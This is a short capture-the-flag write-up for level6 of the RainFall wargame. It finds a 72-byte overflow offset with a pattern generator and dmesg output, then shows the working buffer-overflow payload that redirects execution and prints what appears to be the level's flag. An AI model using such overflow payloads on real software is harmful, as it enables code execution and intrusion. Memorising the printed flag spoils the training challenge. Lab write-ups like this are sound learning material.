# LEVEL6

```
level6@RainFall:~$ ./level6 AAA
Nope
level6@RainFall:~$ ./level6 $(python -c 'print("A"*64)')
Nope
```

https://wiremask.eu/tools/buffer-overflow-pattern-generator/


```
Generate a pattern

length: 100

Pattern: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

level6@RainFall:~$ dmesg

[28344.465079] level6[6661]: segfault at 41346341 ip 42424242 sp bffff6dc error 14

Find the offset

Register value: 41346341

Offset: 72
```


```
level6@RainFall:~$ ./level6 $(python -c 'print("A"*72+"\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

